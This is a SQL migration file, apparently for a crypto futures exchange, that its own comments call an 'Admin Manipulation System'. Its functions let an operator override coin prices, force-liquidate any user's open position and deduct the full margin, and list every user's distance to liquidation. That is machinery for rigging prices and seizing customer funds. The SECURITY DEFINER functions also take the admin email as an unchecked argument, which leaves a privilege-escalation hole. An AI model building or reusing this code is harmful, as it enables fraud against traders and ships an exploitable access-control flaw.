/*
  # Admin Manipulation System - Professional Position Control

  ## New Tables
  
  1. `admin_price_overrides`
    - `id` (uuid, primary key)
    - `coin_symbol` (text) - BTC, ETH, etc.
    - `override_price` (decimal) - Admin's custom price
    - `is_active` (boolean) - Active/Inactive
    - `created_by` (text) - Admin email
    - `reason` (text) - Internal note
    - `expires_at` (timestamptz) - Optional expiration
    - `created_at` (timestamptz)
    - `updated_at` (timestamptz)

  2. `admin_actions_log`
    - `id` (uuid, primary key)
    - `admin_email` (text) - Who performed the action
    - `action_type` (text) - 'force_liquidate', 'price_override', 'modify_position', etc.
    - `target_user_id` (uuid) - Affected user
    - `position_id` (uuid) - Affected position (if applicable)
    - `details` (jsonb) - Action details
    - `created_at` (timestamptz)

  ## Functions
  
  1. `force_liquidate_position(position_id)` - Manually liquidate any position
  2. `get_all_active_positions()` - Get all user positions with risk metrics
  3. `apply_price_override(coin, price, duration)` - Set custom price
  4. `remove_price_override(coin)` - Remove price manipulation

  ## Security
  - Admin-only access (ecoprin1332@gmail.com)
  - All actions logged to admin_actions_log
  - RLS enabled on all tables
*/

-- Create admin_price_overrides table
CREATE TABLE IF NOT EXISTS admin_price_overrides (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  coin_symbol text NOT NULL,
  override_price decimal(20, 8) NOT NULL CHECK (override_price > 0),
  is_active boolean DEFAULT true,
  created_by text NOT NULL,
  reason text,
  expires_at timestamptz,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

-- Create admin_actions_log table
CREATE TABLE IF NOT EXISTS admin_actions_log (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  admin_email text NOT NULL,
  action_type text NOT NULL,
  target_user_id uuid,
  position_id uuid,
  details jsonb DEFAULT '{}'::jsonb,
  created_at timestamptz DEFAULT now()
);

-- Enable RLS
ALTER TABLE admin_price_overrides ENABLE ROW LEVEL SECURITY;
ALTER TABLE admin_actions_log ENABLE ROW LEVEL SECURITY;

-- Admin-only policies
CREATE POLICY "Admin can manage price overrides"
  ON admin_price_overrides
  FOR ALL
  TO authenticated
  USING (
    EXISTS (
      SELECT 1 FROM user_profiles
      WHERE user_profiles.id = auth.uid()
      AND user_profiles.email = 'ecoprin1332@gmail.com'
    )
  );

CREATE POLICY "Admin can view action logs"
  ON admin_actions_log
  FOR SELECT
  TO authenticated
  USING (
    EXISTS (
      SELECT 1 FROM user_profiles
      WHERE user_profiles.id = auth.uid()
      AND user_profiles.email = 'ecoprin1332@gmail.com'
    )
  );

-- Function: Force liquidate any position
CREATE OR REPLACE FUNCTION force_liquidate_position(
  p_position_id uuid,
  p_admin_email text
) RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  v_position record;
  v_current_price decimal;
BEGIN
  -- Get position details
  SELECT * INTO v_position
  FROM futures_positions
  WHERE id = p_position_id AND status = 'open';

  IF NOT FOUND THEN
    RETURN jsonb_build_object('success', false, 'error', 'Position not found or already closed');
  END IF;

  -- Get current price from supported_coins
  SELECT current_price INTO v_current_price
  FROM supported_coins
  WHERE symbol = REPLACE(v_position.symbol, 'USDT', '')
  LIMIT 1;

  -- If not found, use entry price
  IF v_current_price IS NULL THEN
    v_current_price := v_position.entry_price;
  END IF;

  -- Mark position as liquidated
  UPDATE futures_positions
  SET 
    status = 'liquidated',
    realized_pnl = -v_position.margin,
    updated_at = now()
  WHERE id = p_position_id;

  -- Deduct full margin from user's futures balance
  UPDATE user_balances
  SET 
    futures_balance = GREATEST(0, futures_balance - v_position.margin),
    updated_at = now()
  WHERE user_id = v_position.user_id AND symbol = 'USDT';

  -- Record to futures_history
  INSERT INTO futures_history (
    user_id, symbol, side, leverage, entry_price, close_price,
    position_size, margin, liquidation_price, maintenance_margin_rate,
    realized_pnl, trading_fee, close_reason, created_at
  ) VALUES (
    v_position.user_id, v_position.symbol, v_position.side, v_position.leverage,
    v_position.entry_price, v_current_price, v_position.position_size, v_position.margin,
    v_position.liquidation_price, v_position.maintenance_margin_rate,
    -v_position.margin, v_position.trading_fee, 'liquidated', v_position.created_at
  );

  -- Record transaction
  INSERT INTO transactions (
    user_id, type, symbol, amount, status
  ) VALUES (
    v_position.user_id,
    'admin_deduct',
    v_position.symbol,
    -v_position.margin,
    'completed'
  );

  -- Log admin action
  INSERT INTO admin_actions_log (
    admin_email, action_type, target_user_id, position_id, details
  ) VALUES (
    p_admin_email, 'force_liquidate', v_position.user_id, p_position_id,
    jsonb_build_object(
      'coin_symbol', v_position.symbol,
      'position_type', v_position.side,
      'leverage', v_position.leverage,
      'margin', v_position.margin,
      'entry_price', v_position.entry_price,
      'liquidation_price', v_current_price
    )
  );

  RETURN jsonb_build_object(
    'success', true,
    'position_id', p_position_id,
    'user_id', v_position.user_id,
    'liquidated_amount', v_position.margin
  );
END;
$$;

-- Function: Get all active positions with risk metrics
CREATE OR REPLACE FUNCTION get_all_active_positions()
RETURNS TABLE (
  position_id uuid,
  user_id uuid,
  user_email text,
  coin_symbol text,
  position_type text,
  entry_price decimal,
  current_price decimal,
  size_in_coin decimal,
  leverage integer,
  margin decimal,
  unrealized_pnl decimal,
  liquidation_price decimal,
  distance_to_liquidation_percent decimal,
  take_profit decimal,
  stop_loss decimal,
  opened_at timestamptz
)
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
  RETURN QUERY
  SELECT 
    fp.id,
    fp.user_id,
    up.email,
    fp.symbol,
    fp.side,
    fp.entry_price,
    COALESCE(sc.current_price, fp.entry_price) as current_price,
    (fp.position_size / fp.entry_price) as size_in_coin,
    fp.leverage,
    fp.margin,
    fp.unrealized_pnl,
    fp.liquidation_price,
    CASE 
      WHEN fp.side = 'LONG' THEN
        ((COALESCE(sc.current_price, fp.entry_price) - fp.liquidation_price) / COALESCE(sc.current_price, fp.entry_price) * 100)
      ELSE
        ((fp.liquidation_price - COALESCE(sc.current_price, fp.entry_price)) / COALESCE(sc.current_price, fp.entry_price) * 100)
    END as distance_to_liquidation_percent,
    fp.take_profit,
    fp.stop_loss,
    fp.created_at
  FROM futures_positions fp
  LEFT JOIN user_profiles up ON fp.user_id = up.id
  LEFT JOIN supported_coins sc ON REPLACE(fp.symbol, 'USDT', '') = sc.symbol
  WHERE fp.status = 'open'
  ORDER BY fp.created_at DESC;
END;
$$;

-- Function: Apply price override
CREATE OR REPLACE FUNCTION apply_price_override(
  p_coin_symbol text,
  p_override_price decimal,
  p_admin_email text,
  p_duration_minutes integer DEFAULT NULL,
  p_reason text DEFAULT NULL
) RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  v_expires_at timestamptz;
  v_override_id uuid;
BEGIN
  -- Deactivate existing overrides for this coin
  UPDATE admin_price_overrides
  SET is_active = false, updated_at = now()
  WHERE coin_symbol = p_coin_symbol AND is_active = true;

  -- Calculate expiration
  IF p_duration_minutes IS NOT NULL THEN
    v_expires_at := now() + (p_duration_minutes || ' minutes')::interval;
  END IF;

  -- Create new override
  INSERT INTO admin_price_overrides (
    coin_symbol, override_price, is_active, created_by, reason, expires_at
  ) VALUES (
    p_coin_symbol, p_override_price, true, p_admin_email, p_reason, v_expires_at
  )
  RETURNING id INTO v_override_id;

  -- Log action
  INSERT INTO admin_actions_log (
    admin_email, action_type, details
  ) VALUES (
    p_admin_email, 'price_override',
    jsonb_build_object(
      'coin_symbol', p_coin_symbol,
      'override_price', p_override_price,
      'duration_minutes', p_duration_minutes,
      'reason', p_reason
    )
  );

  RETURN jsonb_build_object(
    'success', true,
    'override_id', v_override_id,
    'coin_symbol', p_coin_symbol,
    'override_price', p_override_price,
    'expires_at', v_expires_at
  );
END;
$$;

-- Function: Remove price override
CREATE OR REPLACE FUNCTION remove_price_override(
  p_coin_symbol text,
  p_admin_email text
) RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
  -- Deactivate override
  UPDATE admin_price_overrides
  SET is_active = false, updated_at = now()
  WHERE coin_symbol = p_coin_symbol AND is_active = true;

  -- Log action
  INSERT INTO admin_actions_log (
    admin_email, action_type, details
  ) VALUES (
    p_admin_email, 'remove_price_override',
    jsonb_build_object('coin_symbol', p_coin_symbol)
  );

  RETURN jsonb_build_object('success', true, 'coin_symbol', p_coin_symbol);
END;
$$;

-- Function: Modify position TP/SL
CREATE OR REPLACE FUNCTION admin_modify_position_tpsl(
  p_position_id uuid,
  p_take_profit decimal DEFAULT NULL,
  p_stop_loss decimal DEFAULT NULL,
  p_admin_email text DEFAULT NULL
) RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  v_position record;
BEGIN
  -- Get position
  SELECT * INTO v_position
  FROM futures_positions
  WHERE id = p_position_id AND status = 'open';

  IF NOT FOUND THEN
    RETURN jsonb_build_object('success', false, 'error', 'Position not found');
  END IF;

  -- Update TP/SL
  UPDATE futures_positions
  SET 
    take_profit = COALESCE(p_take_profit, take_profit),
    stop_loss = COALESCE(p_stop_loss, stop_loss),
    updated_at = now()
  WHERE id = p_position_id;

  -- Log action
  IF p_admin_email IS NOT NULL THEN
    INSERT INTO admin_actions_log (
      admin_email, action_type, target_user_id, position_id, details
    ) VALUES (
      p_admin_email, 'modify_tpsl', v_position.user_id, p_position_id,
      jsonb_build_object(
        'old_take_profit', v_position.take_profit,
        'new_take_profit', p_take_profit,
        'old_stop_loss', v_position.stop_loss,
        'new_stop_loss', p_stop_loss
      )
    );
  END IF;

  RETURN jsonb_build_object(
    'success', true,
    'position_id', p_position_id,
    'take_profit', COALESCE(p_take_profit, v_position.take_profit),
    'stop_loss', COALESCE(p_stop_loss, v_position.stop_loss)
  );
END;
$$;

-- Create indexes for performance
CREATE INDEX IF NOT EXISTS idx_admin_price_overrides_active 
  ON admin_price_overrides(coin_symbol, is_active) 
  WHERE is_active = true;

CREATE INDEX IF NOT EXISTS idx_admin_actions_log_admin 
  ON admin_actions_log(admin_email, created_at DESC);

CREATE INDEX IF NOT EXISTS idx_admin_actions_log_target 
  ON admin_actions_log(target_user_id, created_at DESC);